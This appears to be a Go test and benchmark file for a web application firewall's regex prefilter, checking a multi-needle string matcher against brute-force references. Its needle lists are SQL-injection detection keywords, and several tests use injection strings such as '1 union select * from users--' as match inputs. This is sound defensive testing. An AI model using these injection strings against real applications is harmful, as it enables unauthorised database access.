		}
	}
}

// TestIndexedMatcherNeedleCounts verifies the shift-table indexedMatcher produces
// correct results across a range of needle counts (2-16). For each count, it
// validates both match and no-match inputs in CS and CI modes, cross-checking
// against a brute-force reference implementation.
func TestIndexedMatcherNeedleCounts(t *testing.T) {
	pool := []string{
		"select", "union", "insert", "delete", "update",
		"alter", "create", "sleep", "benchmark", "extract",
		"floor", "format", "length", "concat", "decode", "encode",
	}
	haystack := "GET /api/v1/users?page=1&sort=name&order=asc HTTP/1.1"
	matchInputCS := "1 union select * from users--"
	matchInputCI := "1 UNION SELECT * FROM users--"

	bruteForceCS := func(needles []string, s string) bool {
		for _, n := range needles {
			if strings.Contains(s, n) {
				return true
			}
		}
		return false
	}
	bruteForceCI := func(needles []string, s string) bool {
		ls := strings.ToLower(s)
		for _, n := range needles {
			if strings.Contains(ls, strings.ToLower(n)) {
				return true
			}
		}
		return false
	}

	for _, count := range []int{2, 3, 5, 8, 10, 15, 16} {
		needles := pool[:count]

		t.Run(fmt.Sprintf("CS_%d_needles_no_match", count), func(t *testing.T) {
			im := newIndexedMatcher(needles, false)
			got := im.match(haystack)
			want := bruteForceCS(needles, haystack)
			if got != want {
				t.Errorf("CS %d needles no-match: got %v, want %v", count, got, want)
			}
		})

		t.Run(fmt.Sprintf("CS_%d_needles_match", count), func(t *testing.T) {
			im := newIndexedMatcher(needles, false)
			got := im.match(matchInputCS)
			want := bruteForceCS(needles, matchInputCS)
			if got != want {
				t.Errorf("CS %d needles match: got %v, want %v", count, got, want)
			}
		})

		t.Run(fmt.Sprintf("CI_%d_needles_no_match", count), func(t *testing.T) {
			im := newIndexedMatcher(needles, true)
			got := im.match(haystack)
			want := bruteForceCI(needles, haystack)
			if got != want {
				t.Errorf("CI %d needles no-match: got %v, want %v", count, got, want)
			}
		})

		t.Run(fmt.Sprintf("CI_%d_needles_match", count), func(t *testing.T) {
			im := newIndexedMatcher(needles, true)
			got := im.match(matchInputCI)
			want := bruteForceCI(needles, matchInputCI)
			if got != want {
				t.Errorf("CI %d needles match: got %v, want %v", count, got, want)
			}
		})
	}
}

// TestIndexedMatcherEveryNeedle verifies that the matcher finds each individual
// needle when it appears anywhere in the haystack — first position, middle, end,
// and as the entire input.
func TestIndexedMatcherEveryNeedle(t *testing.T) {
	needles := []string{"alpha", "bravo", "charlie", "delta", "echo",
		"foxtrot", "golf", "hotel", "india", "juliet"}

	for _, ci := range []bool{false, true} {
		im := newIndexedMatcher(needles, ci)
		mode := "CS"
		if ci {
			mode = "CI"
		}

		for _, needle := range needles {
			display := needle
			if ci {
				display = strings.ToUpper(needle)
			}

			t.Run(fmt.Sprintf("%s/start_%s", mode, needle), func(t *testing.T) {
				if !im.match(display + " padding after") {
					t.Errorf("expected match for %q at start", display)
				}
			})
			t.Run(fmt.Sprintf("%s/middle_%s", mode, needle), func(t *testing.T) {
				if !im.match("padding " + display + " padding") {
					t.Errorf("expected match for %q in middle", display)
				}
			})
			t.Run(fmt.Sprintf("%s/end_%s", mode, needle), func(t *testing.T) {
				if !im.match("padding before " + display) {
					t.Errorf("expected match for %q at end", display)
				}
			})
			t.Run(fmt.Sprintf("%s/exact_%s", mode, needle), func(t *testing.T) {
				if !im.match(display) {
					t.Errorf("expected match for exact %q", display)
				}
			})
		}

		t.Run(mode+"/no_match", func(t *testing.T) {
			if im.match("nothing relevant here at all xyz") {
				t.Error("expected no match for irrelevant input")
			}
		})
	}
}

// TestIndexedMatcherEdgeCases covers structural edge cases: shared first/last
// bytes, varying needle lengths, boundary positions, and minimal haystacks.
func TestIndexedMatcherEdgeCases(t *testing.T) {
	t.Run("all_same_first_byte", func(t *testing.T) {
		needles := []string{"select", "sleep", "substr", "system", "schema"}
		im := newIndexedMatcher(needles, false)
		if !im.match("call sleep(5)") {
			t.Error("expected match for 'sleep'")
		}
		if !im.match("find substr here") {
			t.Error("expected match for 'substr'")
		}
		if im.match("no s-words that match") {
			t.Error("expected no match")
		}
	})

	t.Run("all_same_last_byte", func(t *testing.T) {
		needles := []string{"update", "delete", "create", "locate", "inate"}
		im := newIndexedMatcher(needles, false)
		if !im.match("please delete this") {
			t.Error("expected match for 'delete'")
		}
		if im.match("nothing matching") {
			t.Error("expected no match")
		}
	})

	t.Run("varying_needle_lengths", func(t *testing.T) {
		needles := []string{"ab", "abcde", "abcdefghij", "xyz", "mn"}
		im := newIndexedMatcher(needles, false)
		if !im.match("contains ab here") {
			t.Error("expected match for shortest needle 'ab'")
		}
		if !im.match("contains abcdefghij here") {
			t.Error("expected match for longest needle")
		}
		if !im.match("contains xyz here") {
			t.Error("expected match for 'xyz'")
		}
		if im.match("nothing relevant") {
			t.Error("expected no match")
		}
	})

	t.Run("haystack_exactly_minlen", func(t *testing.T) {
		needles := []string{"hello", "world", "tests"}
		im := newIndexedMatcher(needles, false)
		if !im.match("hello") {
			t.Error("expected match when haystack == needle == minLen")
		}
		if im.match("nope!") {
			t.Error("expected no match when haystack == minLen but no needle")
		}
	})

	t.Run("haystack_shorter_than_minlen", func(t *testing.T) {
		needles := []string{"hello", "world"}
		im := newIndexedMatcher(needles, false)
		if im.match("hi") {
			t.Error("expected no match when haystack < minLen")
		}
		if im.match("") {
			t.Error("expected no match for empty haystack")
		}
	})

	t.Run("needle_at_exact_end", func(t *testing.T) {
		needles := []string{"zzend", "world"}
		im := newIndexedMatcher(needles, false)
		if !im.match("at the zzend") {
			t.Error("expected match at exact end of haystack")
		}
	})

	t.Run("overlapping_needles", func(t *testing.T) {
		needles := []string{"abc", "bcd", "cde"}
		im := newIndexedMatcher(needles, false)
		if !im.match("xxabcdexx") {
			t.Error("expected match with overlapping needles")
		}
		if !im.match("xxbcdxx") {
			t.Error("expected match for 'bcd'")
		}
	})

	t.Run("ci_mixed_case_needles_at_boundary", func(t *testing.T) {
		needles := []string{"hello", "world"}
		im := newIndexedMatcher(needles, true)
		if !im.match("HELLO") {
			t.Error("CI: expected match for exact uppercase")
		}
		if !im.match("hElLo") {
			t.Error("CI: expected match for mixed case")
		}
		if !im.match("end WORLD") {
			t.Error("CI: expected match at end")
		}
	})

	t.Run("two_needles_minimal", func(t *testing.T) {
		needles := []string{"ab", "cd"}
		im := newIndexedMatcher(needles, false)
		if !im.match("ab") {
			t.Error("expected match for 'ab'")
		}
		if !im.match("cd") {
			t.Error("expected match for 'cd'")
		}
		if im.match("ac") {
			t.Error("expected no match for 'ac'")
		}
		if im.match("x") {
			t.Error("expected no match for too-short input")
		}
	})
}

// TestAnyRequiredThresholdBoundary tests the prefilter at the exact boundary
// between the indexed matcher (N <= 16) and the Aho-Corasick fallback (N > 16).
// Both paths must produce identical correctness behavior.
func TestAnyRequiredThresholdBoundary(t *testing.T) {
	// Generate diverse-prefix words so the regex parser doesn't factor them.
	genWords := func(n int) []string {
		prefixes := "abcdefghijklmnopqrstuvwxyz"
		words := make([]string, n)
		for i := 0; i < n; i++ {
			c := prefixes[i%26]
			words[i] = fmt.Sprintf("%cword%d", c, i)
		}
		return words
	}

	for _, count := range []int{15, 16, 17, 20, 30, 64} {
		words := genWords(count)
		im := newIndexedMatcher(words, false)

		pathName := "indexed"
		if count > anyRequiredMaxN {
			pathName = "too_large"
		}

		for _, needle := range words {
			t.Run(fmt.Sprintf("N%d_%s/match_%s", count, pathName, needle), func(t *testing.T) {
				input := "prefix " + needle + " suffix"
				if !im.match(input) {
					t.Errorf("expected match for needle %q in %q", needle, input)
				}
			})
		}

		t.Run(fmt.Sprintf("N%d_%s/no_match", count, pathName), func(t *testing.T) {
			if im.match("completely irrelevant input with no matching keywords") {
				t.Error("expected no match")
			}
		})
	}
}

// TestAnyRequiredViaPrefilterFuncNeedleCounts builds real regex patterns with
// varying branch counts and verifies the end-to-end prefilter correctness.
// This exercises the full pipeline: parse → extract → build matcher → evaluate.
func TestAnyRequiredViaPrefilterFuncNeedleCounts(t *testing.T) {
	// All words have diverse first bytes so the parser preserves the alternation.
	allWords := []string{
		"alpha", "bravo", "charlie", "delta", "echo",
		"foxtrot", "golf", "hotel", "india", "juliet",
		"kilo", "lima", "mike", "november", "oscar", "papa",
	}
	noMatchInput := "GET /api/v1/resources?page=1&sort=name HTTP/1.1"

	for _, count := range []int{2, 3, 5, 8, 10, 16} {
		words := allWords[:count]
		pattern := "(?:" + strings.Join(words, "|") + ")"

		pf := prefilterFunc(pattern)
		if pf == nil {
			t.Fatalf("N=%d: prefilterFunc returned nil for %q", count, pattern)
		}

		re := regexp.MustCompile(pattern)

		for _, word := range words {
			input := "some " + word + " here"
			t.Run(fmt.Sprintf("N%d/match_%s", count, word), func(t *testing.T) {
				if !re.MatchString(input) {
					t.Fatalf("test bug: regex doesn't match %q", input)
				}
				if !pf(input) {
					t.Errorf("FALSE NEGATIVE: prefilter rejected matching input %q", input)
				}
			})
		}

		t.Run(fmt.Sprintf("N%d/no_match", count), func(t *testing.T) {
			if re.MatchString(noMatchInput) {
				t.Fatal("test bug: regex matches benign input")
			}
			if pf(noMatchInput) {
				// Conservative pass-through is OK, not a failure.
			}
		})
	}
}

// TestIndexedMatcherVsBruteForceExhaustive is a property-based test that
// exercises the matcher with many random-ish inputs across needle counts,
// verifying the result always matches a brute-force reference.
func TestIndexedMatcherVsBruteForceExhaustive(t *testing.T) {
	pool := []string{
		"alpha", "bravo", "charlie", "delta", "echo",
		"foxtrot", "golf", "hotel", "india", "juliet",
		"kilo", "lima", "mike", "november", "oscar", "papa",
	}
	inputs := []string{
		"",
		"x",
		"ab",
		"alpha",
		"ALPHA",
		"bravo at start",
		"end with oscar",
		"mid foxtrot mid",
		"GET /api/v1/users?page=1 HTTP/1.1",
		"no matching keywords here at all",
		strings.Repeat("xyz ", 50),
		"xxalphaxx",
		"xxPAPAxx",
		"golf hotel india",
		"CHARLIE DELTA ECHO",
		"aaaaalimabbbb",
	}

	for _, ci := range []bool{false, true} {
		for _, count := range []int{2, 4, 8, 12, 16} {
			needles := pool[:count]
			im := newIndexedMatcher(needles, ci)

			for _, input := range inputs {
				want := false
				check := input
				if ci {
					check = strings.ToLower(input)
				}
				for _, n := range needles {
					if strings.Contains(check, strings.ToLower(n)) {
						want = true
						break
					}
				}

				got := im.match(input)
				if got != want {
					mode := "CS"
					if ci {
						mode = "CI"
					}
					t.Errorf("%s N=%d input=%q: got %v, want %v",
						mode, count, input, got, want)
				}
			}
		}
	}
}

func BenchmarkRxPrefilter(b *testing.B) {
	benchmarks := []struct {
		name    string
		pattern string
		input   string
	}{
		{
			name:    "crs_sqli_alternation",
			pattern: `(?:union\s+select|insert\s+into|delete\s+from)`,
			input:   "GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
		},
		{
			name:    "crs_sqli_case_insensitive",
			pattern: `(?i)(?:union\s+select|insert\s+into|delete\s+from)`,
			input:   "GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
		},
		{
			name:    "literal_concat",
			pattern: `hello.*world`,
			input:   "just a normal request without any attack payload at all",
		},
		{
			name:    "no_prefilter_charclass",
			pattern: `[a-z]+\d+`,
			input:   "just a normal request without any attack payload at all",
		},
	}

	for _, bm := range benchmarks {
		re := regexp.MustCompile(bm.pattern)
		pf := prefilterFunc(bm.pattern)
		ml := minMatchLength(bm.pattern)

		b.Run(bm.name+"/regex_only", func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				re.MatchString(bm.input)
			}
		})

		b.Run(bm.name+"/prefilter+regex", func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				if len(bm.input) < ml {
					continue
				}
				if pf != nil && !pf(bm.input) {
					continue
				}
				re.MatchString(bm.input)
			}
		})
	}
}

// BenchmarkAnyRequired benchmarks the anyRequired prefilter (indexedMatcher)
// against alternative approaches: a strings.Contains loop and the full regex.
// This isolates the hot path for alternation patterns like (?:union|select|insert).
func BenchmarkAnyRequired(b *testing.B) {
	type bench struct {
		name    string
		needles []string
		ci      bool
		inputs  []string
	}
	benches := []bench{
		{
			name:    "3_needles_CS",
			needles: []string{"union", "insert", "delete"},
			ci:      false,
			inputs: []string{
				"GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
				"POST /api/v1/users HTTP/1.1\r\nContent-Type: application/json",
				strings.Repeat("abcdefghij", 20),
				"short",
			},
		},
		{
			name:    "3_needles_CI",
			needles: []string{"union", "insert", "delete"},
			ci:      true,
			inputs: []string{
				"GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
				"POST /api/v1/users HTTP/1.1\r\nContent-Type: application/json",
				strings.Repeat("abcdefghij", 20),
				"short",
			},
		},
		{
			name:    "6_needles_CS",
			needles: []string{"select", "union", "insert", "delete", "update", "alter"},
			ci:      false,
			inputs: []string{
				"GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
				strings.Repeat("the quick brown fox jumps ", 20),
			},
		},
		{
			name:    "6_needles_CI",
			needles: []string{"select", "union", "insert", "delete", "update", "alter"},
			ci:      true,
			inputs: []string{
				"GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
				strings.Repeat("the quick brown fox jumps ", 20),
			},
		},
		{
			name:    "10_needles_CS",
			needles: []string{"select", "union", "insert", "delete", "update", "alter", "create", "sleep", "benchmark", "extract"},
			ci:      false,
			inputs: []string{
				"GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
				strings.Repeat("the quick brown fox jumps ", 40),
			},
		},
		{
			name:    "10_needles_CI",
			needles: []string{"select", "union", "insert", "delete", "update", "alter", "create", "sleep", "benchmark", "extract"},
			ci:      true,
			inputs: []string{
				"GET /index.html?page=home&user=admin&lang=en HTTP/1.1",
				strings.Repeat("the quick brown fox jumps ", 40),
			},
		},
		{
			name:    "3_needles_CS_match",
			needles: []string{"union", "insert", "delete"},
			ci:      false,
			inputs: []string{
				"1 union select * from users--",
				"insert into t values(1)",
			},
		},
		{
			name:    "3_needles_CI_match",
			needles: []string{"union", "insert", "delete"},
			ci:      true,
			inputs: []string{
				"1 UNION SELECT * FROM users--",
				"INSERT INTO t VALUES(1)",
			},
		},
	}

	for _, bm := range benches {
		// Build the indexedMatcher (our new approach)
		im := newIndexedMatcher(bm.needles, bm.ci)

		// Build a strings.Contains loop closure for comparison
		needlesCopy := make([]string, len(bm.needles))
		copy(needlesCopy, bm.needles)
		var containsLoop func(string) bool
		if bm.ci {
			containsLoop = func(s string) bool {
				for _, needle := range needlesCopy {
					if containsFoldASCII(s, needle) {
						return true
					}
				}
				return false
			}
		} else {
			containsLoop = func(s string) bool {
				for _, needle := range needlesCopy {
					if strings.Contains(s, needle) {
						return true
					}
				}
				return false
			}
		}

		for ii, input := range bm.inputs {
			tag := fmt.Sprintf("input%d_%dB", ii, len(input))

			b.Run(bm.name+"/indexed/"+tag, func(b *testing.B) {
				b.ReportAllocs()
				for i := 0; i < b.N; i++ {
					im.match(input)
				}
			})

			b.Run(bm.name+"/contains_loop/"+tag, func(b *testing.B) {
				b.ReportAllocs()
				for i := 0; i < b.N; i++ {
					containsLoop(input)
				}
			})
		}
	}
}

// BenchmarkAnyRequiredLargeN benchmarks the AC fallback path for large needle
// sets directly. CRS patterns with 50-700+ branches get their ASTs
// restructured by regexp/syntax.Simplify() (common-prefix factoring), so
// extractLiterals often can't extract anyRequired for these patterns.
// This benchmark tests the AC and indexed matchers directly to verify the
// threshold selection is correct.
func BenchmarkAnyRequiredLargeN(b *testing.B) {
	// 50 needles with diverse first bytes (no common-prefix factoring)
	needles := make([]string, 50)
	bases := []string{
		"select", "union", "insert", "delete", "update", "alter", "create",
		"benchmark", "sleep", "extract", "floor", "format", "length",
		"concat", "decode", "encode", "replace", "reverse", "substr",
		"trim", "upper", "lower", "coalesce", "convert", "greatest",
	}
	for i := range needles {
		needles[i] = bases[i%len(bases)] + fmt.Sprintf("%d", i)
	}
	input := "GET /api/v1/users?name=john&sort=created_at&order=desc&page=1&limit=50 HTTP/1.1"

	imSmall := newIndexedMatcher(needles[:10], false)
	imLarge := newIndexedMatcher(needles, false)

	b.Run("10_needles/indexed", func(b *testing.B) {
		b.ReportAllocs()
		for i := 0; i < b.N; i++ {
			imSmall.match(input)
		}
	})
	b.Run("50_needles/indexed", func(b *testing.B) {
		b.ReportAllocs()
		for i := 0; i < b.N; i++ {
			imLarge.match(input)
		}
	})

	b.Run("50_needles/contains_loop", func(b *testing.B) {
		b.ReportAllocs()
		for i := 0; i < b.N; i++ {
			for _, needle := range needles {
				if strings.Contains(input, needle) {
					break
				}
			}
		}
	})

	// Build a regex pattern that triggers the large-N (>16) coregx AC path.
	// Needles must have unique first bytes — regexp/syntax.Simplify() groups
	// branches by first byte, and a single-char literal is rejected by
	// extractLiterals (len < 2). With unique first bytes there is no factoring
	// and every branch keeps its full literal (≥ 2 bytes).
	diverseNeedles := []string{
		// 20 SQL-ish keywords, each starting with a different byte.
		"alpha_func", "bravo_func", "charlie_op", "delta_proc", "echo_call",
		"foxtrot_run", "golf_exec", "hotel_scan", "india_check", "juliet_test",
		"kilo_query", "lima_search", "mike_parse", "november_match", "oscar_find",
		"papa_lookup", "quebec_eval", "romeo_detect", "sierra_verify", "tango_get",
	}
	acPattern := "(?:" + strings.Join(diverseNeedles, "|") + ")"
	acPF := prefilterFunc(acPattern)
	if acPF == nil {
		b.Log("warning: prefilterFunc returned nil for large AC pattern (check extractLiterals)")
	}

	b.Run("20_needles/coregx_ac_via_prefilter", func(b *testing.B) {
		b.ReportAllocs()
		if acPF == nil {
			b.Skip("no prefilter built")
		}
		for i := 0; i < b.N; i++ {
			acPF(input)
		}
	})

	b.Run("20_needles/indexed_via_prefilter", func(b *testing.B) {
		b.ReportAllocs()
		imMed := newIndexedMatcher(diverseNeedles, false)
		for i := 0; i < b.N; i++ {
			imMed.match(input)
		}
	})
}

// BenchmarkAnyRequiredHaystackSize benchmarks the indexedMatcher across
// different haystack sizes to show how it scales.
func BenchmarkAnyRequiredHaystackSize(b *testing.B) {
	needles := []string{"select", "union", "insert", "delete", "update"}
	im := newIndexedMatcher(needles, false)

	sizes := []int{50, 200, 500, 1000, 5000}
	base := "GET /api/v1/resources?page=1&limit=50&sort=name&order=asc HTTP/1.1 "
	for _, size := range sizes {
		var input string
		for len(input) < size {
			input += base
		}
		input = input[:size]

		b.Run(fmt.Sprintf("indexed_%dB", size), func(b *testing.B) {
			b.ReportAllocs()
			for i := 0; i < b.N; i++ {
				im.match(input)
			}
		})

		b.Run(fmt.Sprintf("contains_loop_%dB", size), func(b *testing.B) {
			b.ReportAllocs()
			for i := 0; i < b.N; i++ {
				for _, needle := range needles {
					if strings.Contains(input, needle) {
						break
					}
				}
			}
		})
	}
}

// BenchmarkWuManberHaystackScaling shows how Wu-Manber scales with haystack
// size at N=20 (above the old AC threshold). This validates the decision to
// use Wu-Manber exclusively instead of falling back to Aho-Corasick for large
// N: for typical WAF inputs (50-2000 B), Wu-Manber is 10-50x faster than any
// AC implementation because AC SIMD prefilters call bytes.IndexByte once per
// unique start-byte — O(H×K) for K start bytes.
func BenchmarkWuManberHaystackScaling(b *testing.B) {
	needles := []string{
		"alpha_func", "bravo_func", "charlie_op", "delta_proc", "echo_call",
		"foxtrot_run", "golf_exec", "hotel_scan", "india_check", "juliet_test",
		"kilo_query", "lima_search", "mike_parse", "november_match", "oscar_find",
		"papa_lookup", "quebec_eval", "romeo_detect", "sierra_verify", "tango_get",
	}
	im := newIndexedMatcher(needles, false)
	base := "GET /api/v1/resources?page=1&limit=50&sort=name&order=asc HTTP/1.1 Host: example.com "
	for _, size := range []int{82, 200, 500, 1000, 5000} {
		haystack := strings.Repeat(base, (size/len(base))+1)[:size]
		b.Run(fmt.Sprintf("wu_manber_n20_%dB", size), func(b *testing.B) {
			b.ReportAllocs()
			for i := 0; i < b.N; i++ {
				im.match(haystack)
			}
		})
	}
}
